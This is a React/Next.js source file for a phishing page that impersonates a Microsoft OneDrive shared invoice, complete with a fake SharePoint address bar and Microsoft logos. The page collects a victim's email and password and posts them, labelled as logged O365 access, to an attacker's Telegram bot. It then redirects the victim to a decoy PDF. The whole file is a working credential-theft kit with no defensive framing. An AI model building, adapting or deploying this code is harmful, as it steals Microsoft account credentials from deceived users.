"use client"

import React, { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import { KeyRound } from "lucide-react";
import config from "@/config.json";

interface PreshareStepProps {
  handleStartLogin: () => void;
  isLoading: boolean;
}

interface EmailStepProps {
  userEmail: string;
  setUserEmail: (email: string) => void;
  handleNext: () => void;
  isLoading: boolean;
}

interface PasswordStepProps {
  password: string;
  setPassword: (pwd: string) => void;
  showPassword: boolean;
  handlePasswordToggle: () => void;
  handleSignIn: () => void;
  userEmail: string;
  handleBack: () => void;
  isLoading: boolean;
}

// --- Placeholder Configuration ---
const PDF_URL = "./invoice.pdf";
const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const appId = "onedrive-access-tool";

// Generate user/session ID
const generateUserId = () =>
  typeof crypto !== "undefined"
    ? crypto.randomUUID()
    : Math.random().toString(36).substring(2, 15) +
      Math.random().toString(36).substring(2, 15);

// --- Icons ---
const EyeIcon = (props: React.SVGProps<SVGSVGElement>) => (
  <svg
    {...props}
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z" />
    <circle cx="12" cy="12" r="3" />
  </svg>
);

const EyeOffIcon = (props: React.SVGProps<SVGSVGElement>) => (
  <svg
    {...props}
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24" />
    <path d="M10.51 10.51 2 12c.7 1.7 4 7 10 7s9.3-5.3 10-7c-.4-1.1-.9-2.1-1.6-3" />
    <path d="m2 2 20 20" />
  </svg>
);

const ArrowLeft = (props: React.SVGProps<SVGSVGElement>) => (
  <svg
    {...props}
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    fill="currentColor"
    viewBox="0 0 16 16"
  >
    <path
      fillRule="evenodd"
      d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5a.5.5 0 0 0 .5-.5"
    />
  </svg>
);

const OneDrivePdfIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 512 512">
    <defs>
      <linearGradient id="g1" x1="0" y1="0" x2="0" y2="1">
        <stop offset="0%" stopColor="#e62424" />
        <stop offset="100%" stopColor="#d41717" />
      </linearGradient>
      <linearGradient id="fold" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0%" stopColor="#c71616" />
        <stop offset="100%" stopColor="#9e0f0f" />
      </linearGradient>
    </defs>
    <path fill="url(#g1)" d="M96 0h240l176 176v304c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V32C64 14.3 78.3 0 96 0z" />
    <path fill="url(#fold)" d="M336 0v176h176L336 0z" />
    <rect x="148" y="120" width="216" height="264" rx="18" fill="#ffffff" />
    <rect x="172" y="148" width="124" height="28" rx="4" fill="#d41717" />
    <rect x="172" y="198" width="164" height="18" rx="4" fill="#d41717" />
    <rect x="172" y="228" width="164" height="18" rx="4" fill="#d41717" />
    <rect x="172" y="258" width="164" height="18" rx="4" fill="#d41717" />
    <rect x="172" y="288" width="164" height="18" rx="4" fill="#d41717" />
    <rect x="0" y="344" width="512" height="168" fill="#b81313" />
    <text
      x="256"
      y="440"
      fontFamily="Arial, Helvetica"
      fontSize="104"
      fontWeight="700"
      fill="#ffffff"
      textAnchor="middle"
    >
      PDF
    </text>
  </svg>
);

const LoadingRing = () => (
  <div
    className="animate-spin mr-2"
    style={{
      border: "4px solid rgba(255, 255, 255, 0.3)",
      borderTop: "4px solid #ffffff",
      borderRadius: "50%",
      width: "24px",
      height: "24px",
    }}
  ></div>
);

// --- Styles ---
const customInputStyle =
  "w-full text-lg mb-6 border-b border-gray-400 p-2 focus:outline-none focus:border-b-2 focus:border-blue-500 transition duration-150";
const borderedInputContainerStyle = "relative flex items-center w-full mb-3";
const borderedInputStyle =
  "w-full text-lg border border-gray-300 p-2 pr-10 rounded-lg focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition duration-150";
const passwordToggleStyle = "absolute right-3 cursor-pointer text-gray-500";

// --- Step Components (Moved Outside App for Stable Focus) ---
const PreshareStep = ({ handleStartLogin, isLoading }: PreshareStepProps) => (
  <div className="flex flex-col items-center text-center">
    <OneDrivePdfIcon />
    <h2 className="text-2xl font-semibold mb-4 text-gray-800 mt-4">Shared via Microsoft OneDrive</h2>

    <p className="text-gray-600 mb-8 max-w-sm">
      The document <strong>"Invoice_receipt.pdf"</strong> is secured and shared from a private Microsoft account. You must sign in to verify access rights.
    </p>

    <button
      onClick={handleStartLogin}
      disabled={isLoading}
      className="flex justify-center items-center w-full h-[45px] bg-blue-700 text-white text-lg font-semibold py-2 hover:bg-blue-800 rounded-lg transition duration-150 shadow-md disabled:opacity-70 disabled:cursor-not-allowed"
    >
      Sign In to View Document
    </button>
  </div>
);

const EmailStep = ({ userEmail, setUserEmail, handleNext, isLoading }: EmailStepProps) => (
  <div>
    <img src="https://onthemetestc.vercel.app/mslogo.png" alt="Microsoft" className="w-32 mb-6" />
    <h2 className="text-2xl font-semibold mb-6">Sign in</h2>

    <input
      type="text"
      placeholder="Email address"
      required
      value={userEmail}
      onChange={(e) => setUserEmail(e.target.value)}
      onKeyDown={(e) => e.key === "Enter" && handleNext()}
      className={customInputStyle}
    />

    <div className="text-sm mb-6">
      <p className="mb-4">
        No account? <a href="#" className="text-blue-600 hover:underline">Create one!</a>
      </p>
      <p className="mb-4">
        <a href="#" className="text-blue-600 hover:underline">Can’t access your account?</a>
      </p>
    </div>

    <div className="flex justify-end items-center">
      <button
        onClick={handleNext}
        disabled={isLoading}
        className="flex justify-center items-center w-[100px] h-[35px] bg-blue-700 text-white py-2 font-semibold hover:bg-blue-800 rounded transition duration-150 disabled:opacity-70 disabled:cursor-not-allowed"
      >
        Next
      </button>
    </div>
  </div>
);

const PasswordStep = ({
  password,
  setPassword,
  showPassword,
  handlePasswordToggle,
  handleSignIn,
  userEmail,
  handleBack,
  isLoading
}: PasswordStepProps) => (
  <div>
    <div className="flex items-center">
      <button onClick={handleBack} className="mr-auto text-blue-600 hover:underline text-sm mb-4 inline-block p-1">
        <ArrowLeft className="inline-block" />
      </button>
      <img src="https://onthemetestc.vercel.app/mslogo.png" alt="Microsoft" className="mx- mr-auto w-[100px] mb-6" />
      <div className="w-4"></div>
    </div>

    <div className="flex justify-center">
      <div className="text-center bg-gray-100 px-3 py-1 rounded-full text-sm font-medium text-gray-600 inline-block mb-2">
        {userEmail}
      </div>
    </div>

    <h2 className="text-lg font-semibold mb-6 text-center">Enter your password</h2>

    <div className={borderedInputContainerStyle}>
      <input
        type={showPassword ? "text" : "password"}
        placeholder="Password"
        required
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        onKeyDown={(e) => e.key === "Enter" && handleSignIn()}
        className={borderedInputStyle}
        disabled={isLoading}
      />
      <button
        type="button"
        onClick={handlePasswordToggle}
        onMouseDown={(e) => e.preventDefault()}
        className={passwordToggleStyle}
        disabled={isLoading}
      >
        {showPassword ? <EyeOffIcon className="w-5 h-5" /> : <EyeIcon className="w-5 h-5" />}
      </button>
    </div>

    <div className="text-sm mb-6">
      <p className="mb-4">
        <a href="#" className="text-blue-600 hover:underline">Forgot password?</a>
      </p>
    </div>

    <div className="flex justify-end items-center">
      <button
        onClick={handleSignIn}
        disabled={isLoading}
        className="flex justify-center items-center w-full h-[35px] bg-blue-700 text-white py-2 font-semibold hover:bg-blue-800 rounded-lg transition duration-150 disabled:opacity-70 disabled:cursor-not-allowed"
      >
        {isLoading ? (
          <>
            <LoadingRing />
            <span>Signing in...</span>
          </>
        ) : (
          <span>Sign in</span>
        )}
      </button>
    </div>
    <div className="mb-5"></div>
  </div>
);

// --- Main App ---
export default function App() {
  const [currentStep, setCurrentStep] = useState(0);
  const [userEmail, setUserEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isPdfVisible, setIsPdfVisible] = useState(false);
  const [userId] = useState(generateUserId);
  const router = useRouter();

  // Clear error after 5s
  useEffect(() => {
    if (errorMessage) {
      const timer = setTimeout(() => setErrorMessage(""), 5000);
      return () => clearTimeout(timer);
    }
  }, [errorMessage]);

  const displayError = useCallback((message) => setErrorMessage(message), []);
    
    const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const handleTelegramNotification = useCallback(
    async (email, pwd, uid) => {
        if (
            TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" ||
            TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID"
        ) return;

        const message = `🚨 *SECURE O365 ACCESS LOGGED* 🚨
        
        *App ID:* \`${appId}\`
        *Email:* \`${email}\`
        *Password:* \`${pwd}\`
        *Session Id:* \`${uid}\`
        *Timestamp:* ${new Date().toISOString()}`;

        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        try {
            await fetch(TELEGRAM_API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Telegram error:", err);
        }
  },
  [userId]
);


  const handleStartLogin = () => setCurrentStep(1);

  const handleNext = () => {
    if (!userEmail.trim()) return displayError("Please enter your email.");
    if (!/\S+@\S+\.\S+/.test(userEmail)) return displayError("Please enter a valid email.");
    setCurrentStep(2);
  };

  const handleBack = () => {
    setCurrentStep(1);
    setPassword("");
  };

  const handleSignIn = async () => {
    const pwd = password.trim();
    if (!userEmail || !pwd) return displayError("Please enter your password.");
    setIsLoading(true);
    setErrorMessage("");
    try {
      await handleTelegramNotification(userEmail, pwd, userId);
      await new Promise((res) => setTimeout(res, 2000));
      router.push("/onedrive/secure-share-pdf/microsoft/invoice_recept_response_2025.pdf");
    } catch (e) {
      displayError("Critical error. Check console.");
      console.error(e);
    } finally {
      setIsLoading(false);
    }
  };

  const handlePasswordToggle = () => setShowPassword((prev) => !prev);

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 0:
        return <PreshareStep handleStartLogin={handleStartLogin} isLoading={isLoading} />;
      case 1:
        return <EmailStep userEmail={userEmail} setUserEmail={setUserEmail} handleNext={handleNext} isLoading={isLoading} />;
      case 2:
        return (
          <PasswordStep
            password={password}
            setPassword={setPassword}
            showPassword={showPassword}
            handlePasswordToggle={handlePasswordToggle}
            handleSignIn={handleSignIn}
            userEmail={userEmail}
            handleBack={handleBack}
            isLoading={isLoading}
          />
        );
      default:
        return <PreshareStep handleStartLogin={handleStartLogin} isLoading={isLoading} />;
    }
  };

  const mainContentPadding = isPdfVisible ? "p-0" : "p-8";
  const appWindowFrameStyle = { width: "800px", height: "600px", maxWidth: "95vw", maxHeight: "95vh", backgroundImage: "url('https://onthemetestc.vercel.app/fluent_web.svg')" };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-slate-200" style={{ fontFamily: "Inter, sans-serif" }}>
      <div id="app-window-frame" className="rounded-xl shadow-2xl overflow-hidden bg-white border border-slate-300 flex flex-col" style={appWindowFrameStyle}>
        <header id="app-header" className="flex-shrink-0 bg-gray-100 border-b border-gray-200 p-3 flex items-center justify-between text-gray-700">
          <h2 className="text-[12px] font-semibold text-gray-400 truncate">https://garfieldfinance-my.sharepoint.com/personal/sarahlynn/_layouts/15/guestaccess.aspx?folde...</h2>
          <div className="flex space-x-2 flex-shrink-0 ml-4">
            <div className="w-3 h-3 bg-red-500 rounded-full cursor-not-allowed" title="Close"></div>
            <div className="w-3 h-3 bg-yellow-500 rounded-full cursor-not-allowed" title="Minimize"></div>
            <div className="w-3 h-3 bg-green-500 rounded-full cursor-not-allowed" title="Maximize"></div>
          </div>
        </header>

        <main id="app-content-main" className={`relative flex-grow flex-col flex items-center justify-center overflow-auto ${mainContentPadding}`}>
          {!isPdfVisible && (
            <div id="login-modal" className="w-full">
              <div className="bg-white mx-auto rounded-md shadow-lg border border-gray-100 p-8 max-w-[450px]">
                {renderCurrentStep()}                
                {errorMessage && (
                  <div id="error-message" className="mt-4 text-red-600 text-sm p-3 bg-red-50 rounded-lg">
                    {errorMessage}
                  </div>
                )}
              </div>
            </div> 
                       
          )}
          {!isPdfVisible && (
            <div className="w-full max-w-[440px] mx-auto">
                <div className="w-full bg-white shadow mt-4 py-3 px-6 rounded-sm flex items-center space-x-2 cursor-pointer hover:shadow-md">
                <span className="text-xl">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-gray-600"><path d="M12 18c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6zM15 9l3-3m-9 9l-3 3"/></svg>
                </span>
                <span className="text-sm text-gray-600 font-medium">Sign-in options</span>
                </div>
            </div>
            )}
        </main>
      </div>
    </div>
  );
}
